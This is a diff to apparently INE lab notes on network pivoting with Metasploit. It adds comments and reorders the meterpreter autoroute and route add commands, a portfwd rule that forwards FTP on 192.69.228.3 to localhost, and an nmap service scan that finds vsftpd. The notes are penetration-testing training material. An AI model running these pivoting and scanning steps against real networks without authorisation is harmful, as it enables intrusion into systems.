@@ -44,9 +44,13 @@ root@ine:~# ping 192.69.228.2
 # Use "autoroute" command to add route to unreachable IP range.
 meterpreter > run autoroute -s 192.69.228.0 -n 255.255.255.0
 meterpreter > background
-meterpreter > route print
-meterpreter > route add 192.69.228.0 255.255.255.0 1  - (1 is session id)
-meterpreter > background
+
+# Backgrounded the meterpreter session, now check if route is added to meterpreter.
+msf > route print
+
+# Or alternatively we could use the "route" command to add the routing table to the metasploit framework
+msf > route add 192.69.228.0 255.255.255.0 1  - (1 is session id)
+
 
 # We will run auxiliary TCP port scanning module to discover any available hosts (From IP .3 to .10). And, if any of ports 80, 8080, 445, 21 and 22 are open on those hosts.
 
@@ -61,7 +65,10 @@ exploit
 session -i <session ID>
 portfwd -h
 portfwd add -l 1234 -p 21 -r 192.69.228.3
+portfwd list
 background
+
+# Now scan the second network 
 nmap -sS -sV -p 1234 localhost
 
 # We can observe from the results that host is running vsftpd (FTP) service.
